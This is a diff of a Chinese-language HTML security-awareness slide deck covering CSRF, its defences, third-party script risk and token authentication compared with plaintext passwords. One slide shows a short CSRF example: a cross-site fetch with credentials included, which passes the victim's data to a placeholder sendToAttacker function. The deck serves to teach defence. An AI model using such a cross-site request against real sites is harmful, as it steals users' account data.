-                            <div style="font-size: 1.3rem; color: #ff9500;">→</div>
-                            <div style="flex: 1; background: rgba(255,59,48,0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #ff3b30; text-align: center;">
-                                <div style="font-size: 1.4rem; margin-bottom: 0.3rem;">😈</div>
-                                <p style="font-size: 0.75rem; font-weight: 600; color: #ff3b30;">惡意 B 網站<br>偷發請求</p>
-                                <code style="display: block; margin-top: 0.3rem; font-size: 0.6rem; background: rgba(0,0,0,0.1); padding: 0.2rem; border-radius: 4px;">GET /api/user</code>
-                            </div>
-                            <div style="font-size: 1.3rem; color: #ff3b30;">→</div>
-                            <div style="flex: 1; background: rgba(175,82,222,0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #af52de; text-align: center;">
-                                <div style="font-size: 1.4rem; margin-bottom: 0.3rem;">🏦</div>
-                                <p style="font-size: 0.75rem; font-weight: 600; color: #af52de;">A 網站<br>自動帶 Cookie</p>
-                                <div style="margin-top: 0.3rem; font-size: 0.65rem;">✓ 驗證通過</div>
-                            </div>
-                        </div>
+                <div style="font-size: 1.3rem; color: #ff3b30">→</div>
 
-                        <!-- 互動演示區：左右對比 -->
-                        <div style="display: flex; gap: 0.7rem; margin-bottom: 0.7rem;">
-                            <!-- 左側：A 網站模擬 -->
-                            <div style="flex: 1; background: rgba(52,199,89,0.05); border: 2px solid #34c759; border-radius: 6px; padding: 0.8rem;">
-                                <h3 style="font-size: 0.9rem; margin-bottom: 0.5rem; color: #34c759; text-align: left;">🏦 A 網站（銀行）</h3>
-                                <div style="background: white; padding: 0.6rem; border-radius: 4px; margin-bottom: 0.5rem;">
-                                    <p style="font-size: 0.75rem; color: #666; margin-bottom: 0.4rem;">模擬登入狀態</p>
-                                    <p style="font-size: 0.7rem; color: #34c759; font-family: monospace;">Cookie: session=abc123</p>
-                                </div>
-                                <button id="simulateLoginBtn"
-                                    style="width: 100%; padding: 0.5rem; background: #34c759; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.85rem; font-weight: 600;">
-                                    ✓ 已登入（點擊查看 Cookie）
-                                </button>
-                            </div>
+                <div style="flex: 1; background: rgba(175, 82, 222, 0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #af52de; text-align: center">
+                  <div style="font-size: 1.4rem; margin-bottom: 0.3rem">🏦</div>
 
-                            <!-- 右側：B 網站惡意程式碼 -->
-                            <div style="flex: 1; background: rgba(255,59,48,0.05); border: 2px solid #ff3b30; border-radius: 6px; padding: 0.8rem;">
-                                <h3 style="font-size: 0.9rem; margin-bottom: 0.5rem; color: #ff3b30; text-align: left;">😈 B 網站（惡意）</h3>
-                                <div style="background: rgba(0,0,0,0.85); padding: 0rem; border-radius: 4px; margin-bottom: 0.5rem;">
-                                    <pre style="font-size: 1rem; color: #34c759; line-height: 1.3; margin: 0; text-align: left;"><code>fetch('https://bank-a.com/api/user', {
+                  <p style="font-size: 0.75rem; font-weight: 600; color: #af52de">A 網站<br />自動帶 Cookie</p>
+
+                  <div style="margin-top: 0.3rem; font-size: 0.65rem">✓ 驗證通過</div>
+                </div>
+              </div>
+
+              <!-- 互動演示區：左右對比 -->
+
+              <div style="display: flex; gap: 0.7rem; margin-bottom: 0.7rem">
+                <!-- 左側：A 網站模擬 -->
+
+                <div style="flex: 1; background: rgba(52, 199, 89, 0.05); border: 2px solid #34c759; border-radius: 6px; padding: 0.8rem">
+                  <h3 style="font-size: 0.9rem; margin-bottom: 0.5rem; color: #34c759; text-align: left">🏦 A 網站（銀行）</h3>
+
+                  <div style="background: white; padding: 0.6rem; border-radius: 4px; margin-bottom: 0.5rem">
+                    <p style="font-size: 0.75rem; color: #666; margin-bottom: 0.4rem">模擬登入狀態</p>
+
+                    <p style="font-size: 0.7rem; color: #34c759; font-family: monospace">Cookie: session=abc123</p>
+                  </div>
+
+                  <button id="simulateLoginBtn" style="width: 100%; padding: 0.5rem; background: #34c759; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.85rem; font-weight: 600">✓ 已登入（點擊查看 Cookie）</button>
+                </div>
+
+                <!-- 右側：B 網站惡意程式碼 -->
+
+                <div style="flex: 1; background: rgba(255, 59, 48, 0.05); border: 2px solid #ff3b30; border-radius: 6px; padding: 0.8rem">
+                  <h3 style="font-size: 0.9rem; margin-bottom: 0.5rem; color: #ff3b30; text-align: left">😈 B 網站（惡意）</h3>
+
+                  <div style="background: rgba(0, 0, 0, 0.85); padding: 0rem; border-radius: 4px; margin-bottom: 0.5rem">
+                    <pre style="font-size: 1rem; color: #34c759; line-height: 1.3; margin: 0; text-align: left"><code>fetch('https://bank-a.com/api/user', {
+
   credentials: 'include'
+
 })
+
 .then(r => r.json())
+
 .then(data => {
+
   // 竊取會員資料
+
   sendToAttacker(data);
+
 });</code></pre>
-                                </div>
-                                <button id="csrfAttackBtn"
-                                    style="width: 100%; padding: 0.5rem; background: #ff3b30; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.85rem; font-weight: 600;">
-                                    ⚠️ 執行 CSRF 攻擊
-                                </button>
-                            </div>
-                        </div>
+                  </div>
 
-                        <!-- 說明 -->
-                        <div style="background: rgba(255,149,0,0.1); padding: 0.7rem; border-radius: 6px; border-left: 3px solid #ff9500;">
-                            <p style="font-size: 0.75rem; line-height: 1.4; color: #333; text-align: left;">
-                                💡 <strong>CSRF 關鍵</strong>：瀏覽器會自動把 A 網站的 Cookie 帶到 B 網站發出的請求中！即使你在 B 網站，請求 A 網站的 API 時，Cookie 仍會自動附上，導致 A 網站誤認為是合法請求。
-                            </p>
-                        </div>
-                    </div>
+                  <button id="csrfAttackBtn" style="width: 100%; padding: 0.5rem; background: #ff3b30; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.85rem; font-weight: 600">⚠️ 執行 CSRF 攻擊</button>
                 </div>
-            </section>
+              </div>
 
-            <!-- Slide 11：CSRF — 修法 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2.2rem; margin-bottom: 1.2rem; color: var(--primary-blue);">CSRF 防護措施</h2>
-                    <div style="max-width: 720px; margin: 0 auto;">
-                        <div style="display: flex; flex-direction: column; gap: 1rem;">
-                            <div style="background: rgba(0,122,255,0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid var(--primary-blue);">
-                                <h3 style="color: var(--primary-blue); font-size: 1.2rem; margin-bottom: 0.6rem;">🍪 Cookie 設定</h3>
-                                <p style="font-size: 0.9rem; line-height: 1.4;">SameSite=Lax/Strict + Secure + HttpOnly</p>
-                            </div>
-                            <div style="background: rgba(52,199,89,0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #34c759;">
-                                <h3 style="color: #34c759; font-size: 1.2rem; margin-bottom: 0.6rem;">🎫 CSRF Token</h3>
-                                <p style="font-size: 0.9rem; line-height: 1.4;">後端發 Token，前端回送驗證</p>
-                            </div>
-                            <div style="background: rgba(255,149,0,0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #ff9500;">
-                                <h3 style="color: #ff9500; font-size: 1.2rem; margin-bottom: 0.6rem;">🔐 二次驗證</h3>
-                                <p style="font-size: 0.9rem; line-height: 1.4;">重要操作要求再次輸入密碼/OTP</p>
-                            </div>
-                        </div>
-                    </div>
+              <!-- 說明 -->
+
+              <div style="background: rgba(255, 149, 0, 0.1); padding: 0.7rem; border-radius: 6px; border-left: 3px solid #ff9500">
+                <p style="font-size: 0.75rem; line-height: 1.4; color: #333; text-align: left">💡 <strong>CSRF 關鍵</strong>：瀏覽器會自動把 A 網站的 Cookie 帶到 B 網站發出的請求中！即使你在 B 網站，請求 A 網站的 API 時，Cookie 仍會自動附上，導致 A 網站誤認為是合法請求。</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 11：CSRF — 修法 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2.2rem; margin-bottom: 1.2rem; color: var(--primary-blue)">CSRF 防護措施</h2>
+
+            <div style="max-width: 720px; margin: 0 auto">
+              <div style="display: flex; flex-direction: column; gap: 1rem">
+                <div style="background: rgba(0, 122, 255, 0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid var(--primary-blue)">
+                  <h3 style="color: var(--primary-blue); font-size: 1.2rem; margin-bottom: 0.6rem">🍪 Cookie 設定</h3>
+
+                  <p style="font-size: 0.9rem; line-height: 1.4">SameSite=Lax/Strict + Secure + HttpOnly</p>
                 </div>
-            </section>
 
-            <!-- Slide 13：第三方腳本風險 (精簡版 - 含案例) -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2rem; margin-bottom: 0.8rem; color: var(--primary-blue);">第三方腳本 / 供應鏈風險</h2>
-                    <div style="max-width: 750px; margin: 0 auto;">
-                        <!-- 真實案例 -->
-                        <div style="background: rgba(255,59,48,0.1); padding: 1rem; border-radius: var(--radius-medium); margin-bottom: 0.9rem; border: 2px solid rgba(255,59,48,0.3);">
-                            <h3 style="color: #ff3b30; font-size: 1.05rem; margin-bottom: 0.5rem;">📖 真實案例</h3>
-                            <p style="font-size: 0.85rem; line-height: 1.4; margin-bottom: 0.3rem;">客服聊天外掛被駭 → 插入假通知 → 3 小時 2,000+ 人上當</p>
-                        </div>
+                <div style="background: rgba(52, 199, 89, 0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #34c759">
+                  <h3 style="color: #34c759; font-size: 1.2rem; margin-bottom: 0.6rem">🎫 CSRF Token</h3>
 
-                        <!-- 風險視覺化 -->
-                        <div style="background: rgba(255,149,0,0.1); padding: 1rem; border-radius: var(--radius-medium); margin-bottom: 0.9rem; border: 2px solid rgba(255,149,0,0.3); text-align: center;">
-                            <div style="font-size: 2rem; margin-bottom: 0.5rem;">⛓️</div>
-                            <h3 style="color: #ff9500; font-size: 1.05rem; margin-bottom: 0.5rem;">外部 JS 被攻陷 → 全站受影響</h3>
-                            <div style="display: flex; justify-content: center; gap: 0.6rem; margin-top: 0.5rem; flex-wrap: wrap;">
-                                <span style="padding: 0.3rem 0.6rem; background: white; border-radius: 6px; font-size: 0.75rem;">📊 Analytics</span>
-                                <span style="padding: 0.3rem 0.6rem; background: white; border-radius: 6px; font-size: 0.75rem;">💬 Chat Widget</span>
-                                <span style="padding: 0.3rem 0.6rem; background: white; border-radius: 6px; font-size: 0.75rem;">📦 CDN</span>
-                            </div>
-                        </div>
-
-                        <!-- 建議措施 -->
-                        <div style="background: var(--background-tertiary); padding: 1rem; border-radius: var(--radius-medium);">
-                            <h3 style="font-size: 1rem; margin-bottom: 0.6rem; color: var(--primary-blue);">🛡️ 你可以做什麼</h3>
-                            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.4rem; font-size: 0.8rem; text-align: left;">
-                                <p>• 列清單 (來源/用途)</p>
-                                <p>• 鎖版本 (SRI)</p>
-                                <p>• 重要頁面禁用非必要腳本</p>
-                                <p>• 本地化關鍵功能</p>
-                            </div>
-                        </div>
-                    </div>
+                  <p style="font-size: 0.9rem; line-height: 1.4">後端發 Token，前端回送驗證</p>
                 </div>
-            </section>
 
-            <!-- Slide 14：Token 安全 — 生活比喻 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2.2rem; margin-bottom: 1.2rem; color: var(--primary-blue);">Token 認證機制</h2>
-                    <p style="font-size: 1.1rem; margin-bottom: 1.2rem; color: var(--text-secondary);">就像辦公大樓的臨時通行證</p>
-                    <div style="max-width: 800px; margin: 0 auto;">
-                        <!-- 場景對比 -->
-                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 1.2rem; margin-bottom: 1.2rem;">
-                            <!-- 明碼密碼（危險） -->
-                            <div style="background: rgba(255,59,48,0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(255,59,48,0.3);">
-                                <div style="text-align: center; font-size: 3rem; margin-bottom: 0.8rem;">📝</div>
-                                <h3 style="color: #ff3b30; font-size: 1.2rem; margin-bottom: 0.8rem; text-align: center;">❌ 明碼密碼</h3>
-                                <p style="font-size: 1rem; line-height: 1.6; text-align: center;">
-                                    把身分證號碼<br>寫在胸前走來走去<br>
-                                    <span style="color: #ff3b30; font-weight: 700;">→ 永久性風險</span>
-                                </p>
-                            </div>
+                <div style="background: rgba(255, 149, 0, 0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #ff9500">
+                  <h3 style="color: #ff9500; font-size: 1.2rem; margin-bottom: 0.6rem">🔐 二次驗證</h3>
 
-                            <!-- Token（安全） -->
-                            <div style="background: rgba(52,199,89,0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(52,199,89,0.3);">
-                                <div style="text-align: center; font-size: 3rem; margin-bottom: 0.8rem;">🎫</div>
-                                <h3 style="color: #34c759; font-size: 1.2rem; margin-bottom: 0.8rem; text-align: center;">✓ Token</h3>
-                                <p style="font-size: 1rem; line-height: 1.6; text-align: center;">
-                                    臨時通行證<br>過期就失效<br>
-                                    <span style="color: #34c759; font-weight: 700;">→ 限時有效</span>
-                                </p>
-                            </div>
-                        </div>
-
-                        <!-- 運作流程 -->
-                        <div style="background: var(--background-tertiary); padding: 1.5rem; border-radius: var(--radius-medium);">
-                            <h3 style="font-size: 1.2rem; margin-bottom: 1rem; color: var(--primary-blue);">🏢 實際運作</h3>
-                            <div style="display: flex; flex-direction: column; gap: 0.8rem; font-size: 1rem;">
-                                <p>1️⃣ 早上 9:00 → 警衛發給你今日通行證（登入取得 Token）</p>
-                                <p>2️⃣ 下午 6:00 → 通行證失效（Token 過期）</p>
-                                <p>3️⃣ 明天重新領證（重新登入）</p>
-                            </div>
-                        </div>
-                    </div>
+                  <p style="font-size: 0.9rem; line-height: 1.4">重要操作要求再次輸入密碼/OTP</p>
                 </div>
-            </section>
+              </div>
+            </div>
+          </div>
+        </section>
 
-            <!-- Slide 15：明碼的危險 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 1.9rem; margin-bottom: 0.9rem; color: var(--primary-blue);">為什麼明碼是永久性風險？</h2>
-                    <div style="max-width: 800px; margin: 0 auto;">
-                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.8rem; margin-bottom: 0.9rem;">
-                            <!-- 場景一 -->
-                            <div style="background: rgba(255,149,0,0.1); padding: 0.9rem; border-radius: var(--radius-medium); border-left: 3px solid #ff9500;">
-                                <h3 style="color: #ff9500; font-size: 0.95rem; margin-bottom: 0.4rem;">☕ 咖啡廳偷窺</h3>
-                                <p style="font-size: 0.8rem; line-height: 1.4;">→ 有人看到你螢幕上的密碼</p>
-                                <p style="font-size: 0.8rem; line-height: 1.4; color: #ff9500; font-weight: 600;">→ 永遠可以登入</p>
-                            </div>
+        <!-- Slide 13：第三方腳本風險 (精簡版 - 含案例) -->
 
-                            <!-- 場景二 -->
-                            <div style="background: rgba(255,59,48,0.1); padding: 0.9rem; border-radius: var(--radius-medium); border-left: 3px solid #ff3b30;">
-                                <h3 style="color: #ff3b30; font-size: 0.95rem; margin-bottom: 0.4rem;">💾 資料庫被駭</h3>
-                                <p style="font-size: 0.8rem; line-height: 1.4;">→ 所有密碼被看光</p>
-                                <p style="font-size: 0.8rem; line-height: 1.4; color: #ff3b30; font-weight: 600;">→ 受害者換密碼前都有效</p>
-                            </div>
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2rem; margin-bottom: 0.8rem; color: var(--primary-blue)">第三方腳本 / 供應鏈風險</h2>
 
-                            <!-- 場景三 -->
-                            <div style="background: rgba(175,82,222,0.1); padding: 0.9rem; border-radius: var(--radius-medium); border-left: 3px solid #af52de;">
-                                <h3 style="color: #af52de; font-size: 0.95rem; margin-bottom: 0.4rem;">🔗 撞庫攻擊</h3>
-                                <p style="font-size: 0.8rem; line-height: 1.4;">→ 同密碼用多個網站</p>
-                                <p style="font-size: 0.8rem; line-height: 1.4; color: #af52de; font-weight: 600;">→ 一個被盜全部遭殃</p>
-                            </div>
+            <div style="max-width: 750px; margin: 0 auto">
+              <!-- 真實案例 -->
 
-                            <!-- 場景四 -->
-                            <div style="background: rgba(255,45,85,0.1); padding: 0.9rem; border-radius: var(--radius-medium); border-left: 3px solid #ff2d55;">
-                                <h3 style="color: #ff2d55; font-size: 0.95rem; margin-bottom: 0.4rem;">👥 內部員工</h3>
-                                <p style="font-size: 0.8rem; line-height: 1.4;">→ 離職員工還記得密碼</p>
-                                <p style="font-size: 0.8rem; line-height: 1.4; color: #ff2d55; font-weight: 600;">→ 隨時可能回來搞破壞</p>
-                            </div>
-                        </div>
+              <div style="background: rgba(255, 59, 48, 0.1); padding: 1rem; border-radius: var(--radius-medium); margin-bottom: 0.9rem; border: 2px solid rgba(255, 59, 48, 0.3)">
+                <h3 style="color: #ff3b30; font-size: 1.05rem; margin-bottom: 0.5rem">📖 真實案例</h3>
 
-                        <!-- 對比：Token 的優勢 -->
-                        <div style="background: rgba(52,199,89,0.1); padding: 1.1rem; border-radius: var(--radius-medium); border: 2px solid rgba(52,199,89,0.3);">
-                            <h3 style="color: #34c759; font-size: 1.05rem; margin-bottom: 0.5rem;">✅ Token 如何解決</h3>
-                            <p style="font-size: 0.9rem; line-height: 1.5;">
-                                Token 每 15 分鐘過期 → 即使被偷，時間到就失效<br>
-                                離職員工的 Token 立即撤銷 → 無法再進入系統
-                            </p>
-                        </div>
-                    </div>
+                <p style="font-size: 0.85rem; line-height: 1.4; margin-bottom: 0.3rem">客服聊天外掛被駭 → 插入假通知 → 3 小時 2,000+ 人上當</p>
+              </div>
+
+              <!-- 風險視覺化 -->
+
+              <div style="background: rgba(255, 149, 0, 0.1); padding: 1rem; border-radius: var(--radius-medium); margin-bottom: 0.9rem; border: 2px solid rgba(255, 149, 0, 0.3); text-align: center">
+                <div style="font-size: 2rem; margin-bottom: 0.5rem">⛓️</div>
+
+                <h3 style="color: #ff9500; font-size: 1.05rem; margin-bottom: 0.5rem">外部 JS 被攻陷 → 全站受影響</h3>
+
+                <div style="display: flex; justify-content: center; gap: 0.6rem; margin-top: 0.5rem; flex-wrap: wrap">
+                  <span style="padding: 0.3rem 0.6rem; background: white; border-radius: 6px; font-size: 0.75rem">📊 Analytics</span>
+
+                  <span style="padding: 0.3rem 0.6rem; background: white; border-radius: 6px; font-size: 0.75rem">💬 Chat Widget</span>
+
+                  <span style="padding: 0.3rem 0.6rem; background: white; border-radius: 6px; font-size: 0.75rem">📦 CDN</span>
                 </div>
-            </section>
+              </div>
 
-            <!-- Slide 16：Token 安全檢查重點 (精簡版) -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2rem; margin-bottom: 0.8rem; color: var(--primary-blue);">你可以檢查的 Token 安全指標</h2>
-                    <p style="font-size: 0.9rem; margin-bottom: 0.9rem; color: var(--text-secondary);">不用懂技術,也能看出系統有沒有做好</p>
-                    <div style="max-width: 750px; margin: 0 auto;">
-                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.9rem;">
-                            <!-- 檢查點 1 -->
-                            <div style="background: rgba(52,199,89,0.1); padding: 1rem; border-radius: var(--radius-medium); border-left: 4px solid #34c759;">
-                                <h3 style="color: #34c759; font-size: 1rem; margin-bottom: 0.4rem;">✅ 會自動登出?</h3>
-                                <p style="font-size: 0.8rem; line-height: 1.3;">15-30 分鐘沒操作應該登出<br>→ 有設定有效期限</p>
-                            </div>
+              <!-- 建議措施 -->
 
-                            <!-- 檢查點 2 -->
-                            <div style="background: rgba(0,122,255,0.1); padding: 1rem; border-radius: var(--radius-medium); border-left: 4px solid var(--primary-blue);">
-                                <h3 style="color: var(--primary-blue); font-size: 1rem; margin-bottom: 0.4rem;">✅ 需二次驗證?</h3>
-                                <p style="font-size: 0.8rem; line-height: 1.3;">轉帳/改密碼要再輸密碼<br>→ 有額外防護</p>
-                            </div>
+              <div style="background: var(--background-tertiary); padding: 1rem; border-radius: var(--radius-medium)">
+                <h3 style="font-size: 1rem; margin-bottom: 0.6rem; color: var(--primary-blue)">🛡️ 你可以做什麼</h3>
 
-                            <!-- 檢查點 3 -->
-                            <div style="background: rgba(255,149,0,0.1); padding: 1rem; border-radius: var(--radius-medium); border-left: 4px solid #ff9500;">
-                                <h3 style="color: #ff9500; font-size: 1rem; margin-bottom: 0.4rem;">✅ 可登出所有裝置?</h3>
-                                <p style="font-size: 0.8rem; line-height: 1.3;">一鍵撤銷所有登入<br>→ 可撤銷 Token</p>
-                            </div>
+                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.4rem; font-size: 0.8rem; text-align: left">
+                  <p>• 列清單 (來源/用途)</p>
 
-                            <!-- 檢查點 4 -->
-                            <div style="background: rgba(255,59,48,0.1); padding: 1rem; border-radius: var(--radius-medium); border-left: 4px solid #ff3b30;">
-                                <h3 style="color: #ff3b30; font-size: 1rem; margin-bottom: 0.4rem;">✅ 異常登入通知?</h3>
-                                <p style="font-size: 0.8rem; line-height: 1.3;">新裝置登入會收通知<br>→ 有偵測異常</p>
-                            </div>
-                        </div>
-                    </div>
+                  <p>• 鎖版本 (SRI)</p>
+
+                  <p>• 重要頁面禁用非必要腳本</p>
+
+                  <p>• 本地化關鍵功能</p>
                 </div>
-            </section>
+              </div>
+            </div>
+          </div>
+        </section>
 
-            <!-- Slide 17：Token 核心特色 (精簡版) -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2rem; margin-bottom: 0.8rem; color: var(--primary-blue);">Token 的核心特色</h2>
-                    <p style="font-size: 0.9rem; margin-bottom: 0.9rem; color: var(--text-secondary);">為什麼 Token 比明碼密碼安全?</p>
-                    <div style="max-width: 700px; margin: 0 auto;">
-                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.9rem; margin-bottom: 1rem;">
-                            <!-- 特色 1 -->
-                            <div style="background: rgba(52,199,89,0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid #34c759;">
-                                <div style="text-align: center; font-size: 2rem; margin-bottom: 0.5rem;">⏱️</div>
-                                <h3 style="color: #34c759; font-size: 0.95rem; margin-bottom: 0.4rem; text-align: center;">有效期限</h3>
-                                <p style="font-size: 0.75rem; line-height: 1.3; text-align: center;">過期自動失效</p>
-                            </div>
+        <!-- Slide 14：Token 安全 — 生活比喻 -->
 
-                            <!-- 特色 2 -->
-                            <div style="background: rgba(0,122,255,0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid var(--primary-blue);">
-                                <div style="text-align: center; font-size: 2rem; margin-bottom: 0.5rem;">🚫</div>
-                                <h3 style="color: var(--primary-blue); font-size: 0.95rem; margin-bottom: 0.4rem; text-align: center;">可撤銷</h3>
-                                <p style="font-size: 0.75rem; line-height: 1.3; text-align: center;">登出立即失效</p>
-                            </div>
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2.2rem; margin-bottom: 1.2rem; color: var(--primary-blue)">Token 認證機制</h2>
 
-                            <!-- 特色 3 -->
-                            <div style="background: rgba(255,149,0,0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid #ff9500;">
-                                <div style="text-align: center; font-size: 2rem; margin-bottom: 0.5rem;">🔐</div>
-                                <h3 style="color: #ff9500; font-size: 0.95rem; margin-bottom: 0.4rem; text-align: center;">防偽造</h3>
-                                <p style="font-size: 0.75rem; line-height: 1.3; text-align: center;">數位簽名驗證</p>
-                            </div>
+            <p style="font-size: 1.1rem; margin-bottom: 1.2rem; color: var(--text-secondary)">就像辦公大樓的臨時通行證</p>
 
-                            <!-- 特色 4 -->
-                            <div style="background: rgba(175,82,222,0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid #af52de;">
-                                <div style="text-align: center; font-size: 2rem; margin-bottom: 0.5rem;">🔔</div>
-                                <h3 style="color: #af52de; font-size: 0.95rem; margin-bottom: 0.4rem; text-align: center;">異常偵測</h3>
-                                <p style="font-size: 0.75rem; line-height: 1.3; text-align: center;">綁定裝置資訊</p>
-                            </div>
-                        </div>
+            <div style="max-width: 800px; margin: 0 auto">
+              <!-- 場景對比 -->
 
-                        <!-- 核心訊息 -->
-                        <div style="background: rgba(52,199,89,0.1); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(52,199,89,0.3);">
-                            <p style="font-size: 1rem; font-weight: 600; color: #34c759; text-align: center; margin-bottom: 0.4rem;">
-                                明碼密碼 = 永久鑰匙 (被偷永久有效)
-                            </p>
-                            <p style="font-size: 1rem; font-weight: 600; color: var(--primary-blue); text-align: center;">
-                                Token = 臨時通行證 (限時、可撤銷、可偵測)
-                            </p>
-                        </div>
-                    </div>
+              <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 1.2rem; margin-bottom: 1.2rem">
+                <!-- 明碼密碼（危險） -->
+
+                <div style="background: rgba(255, 59, 48, 0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(255, 59, 48, 0.3)">
+                  <div style="text-align: center; font-size: 3rem; margin-bottom: 0.8rem">📝</div>
+
+                  <h3 style="color: #ff3b30; font-size: 1.2rem; margin-bottom: 0.8rem; text-align: center">❌ 明碼密碼</h3>
+
+                  <p style="font-size: 1rem; line-height: 1.6; text-align: center">
+                    把身分證號碼<br />寫在胸前走來走去<br />
+
+                    <span style="color: #ff3b30; font-weight: 700">→ 永久性風險</span>
+                  </p>
                 </div>
-            </section>
 
-            <!-- Slide 17.5：網站架構回顧與資安對應 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 1.9rem; margin-bottom: 0.7rem; color: var(--primary-blue);">回顧：網站三層架構與資安職責</h2>
-                    <p style="font-size: 0.9rem; margin-bottom: 0.9rem; color: var(--text-secondary);">理解你的角色，才知道該守護什麼</p>
-                    <div style="max-width: 900px; margin: 0 auto;">
-                        <!-- 三層架構 -->
-                        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.7rem; margin-bottom: 0.9rem;">
-                            <!-- 前端 -->
-                            <div style="background: rgba(0,122,255,0.08); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid var(--primary-blue);">
-                                <div style="text-align: center; margin-bottom: 0.6rem;">
-                                    <div style="font-size: 2.2rem; margin-bottom: 0.3rem;">📱</div>
-                                    <h3 style="color: var(--primary-blue); font-size: 1.05rem; margin-bottom: 0.2rem;">前端（用戶端）</h3>
-                                    <p style="font-size: 0.7rem; color: #666;">跑在使用者裝置上</p>
-                                </div>
-                                <div style="background: rgba(255,255,255,0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem;">
-                                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #34c759;">✅ 能做的</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem;">• 基本檢查（欄位格式）</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3;">• 使用者體驗回饋</p>
-                                </div>
-                                <div style="background: rgba(255,255,255,0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem;">
-                                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #ff3b30;">⚠️ 不能單靠的</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem;">• 安全檢查（可被改）</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3;">• 權限控管、金額驗證</p>
-                                </div>
-                                <div style="background: rgba(0,122,255,0.15); padding: 0.6rem; border-radius: 6px;">
-                                    <p style="font-size: 0.75rem; line-height: 1.3; font-weight: 600; color: var(--primary-blue);">🏦 就像櫃檯職員</p>
-                                    <p style="font-size: 0.65rem; line-height: 1.3; color: #666;">能提醒表格填對，但不能核准貸款</p>
-                                </div>
-                            </div>
+                <!-- Token（安全） -->
 
-                            <!-- 後端 -->
-                            <div style="background: rgba(52,199,89,0.08); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid #34c759;">
-                                <div style="text-align: center; margin-bottom: 0.6rem;">
-                                    <div style="font-size: 2.2rem; margin-bottom: 0.3rem;">🖥️</div>
-                                    <h3 style="color: #34c759; font-size: 1.05rem; margin-bottom: 0.2rem;">後端（伺服器）</h3>
-                                    <p style="font-size: 0.7rem; color: #666;">公司自己控制</p>
-                                </div>
-                                <div style="background: rgba(255,255,255,0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem;">
-                                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #34c759;">✅ 要負責的</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem;">• 身分驗證 & 權限管理</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3; margin-bottom: 0.2rem;">• 資料正確性檢查</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3;">• Rate Limit、加密日誌</p>
-                                </div>
-                                <div style="background: rgba(255,255,255,0.6); padding: 0.7rem; border-radius: 6px; margin-bottom: 0.6rem;">
-                                    <p style="font-size: 0.8rem; font-weight: 600; margin-bottom: 0.4rem; color: #ff3b30;">⚠️ 為什麼重要</p>
-                                    <p style="font-size: 0.7rem; line-height: 1.3;">攻擊者可跳過前端直接打 API，只有後端能把關</p>
-                                </div>
-                                <div style="background: rgba(52,199,89,0.15); padding: 0.6rem; border-radius: 6px;">
-                                    <p style="font-size: 0.75rem; line-height: 1.3; font-weight: 600; color: #34c759;">🏦 就像銀行金庫</p>
-                                    <p style="font-size: 0.65rem; line-height: 1.3; color: #666;">決定誰能開保險箱、提領上限</p>
-                                </div>
-                            </div>
+                <div style="background: rgba(52, 199, 89, 0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(52, 199, 89, 0.3)">
+                  <div style="text-align: center; font-size: 3rem; margin-bottom: 0.8rem">🎫</div>
 
-                            <!-- 平台 -->
